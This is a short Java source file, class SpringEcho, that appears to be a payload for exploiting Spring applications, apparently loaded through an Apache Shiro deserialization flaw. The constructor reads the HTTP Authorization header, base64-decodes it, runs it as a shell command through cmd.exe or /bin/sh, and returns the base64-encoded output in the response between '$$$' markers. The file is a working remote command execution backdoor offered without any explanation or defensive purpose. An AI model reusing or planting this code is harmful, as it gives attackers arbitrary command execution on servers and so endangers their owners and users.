/**
 * @ClassName: SpringEcho
 * @Description: TODO
 * @Author: Summer
 * @Date: 2022/1/19 13:37
 * @Version: v1.0.0
 * @Description:
 **/
public class SpringEcho {
    public SpringEcho() throws Exception {
            try {
                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();

                String te = httprequest.getHeader("Host");
                httpresponse.addHeader("Host", te);
                String tc = httprequest.getHeader("Authorization");
                if (tc != null && !tc.isEmpty()) {
                    String p = org.apache.shiro.codec.Base64.decodeToString(tc.replaceAll("Basic ", ""));
                    String[] cmd = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                    String base64Str = "";
                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);
                    httpresponse.getWriter().write("$$$" + base64Str + "$$$");

                }
                httpresponse.getWriter().flush();
                httpresponse.getWriter().close();
            } catch (Exception e) {
                e.getStackTrace();
            }
        }

}
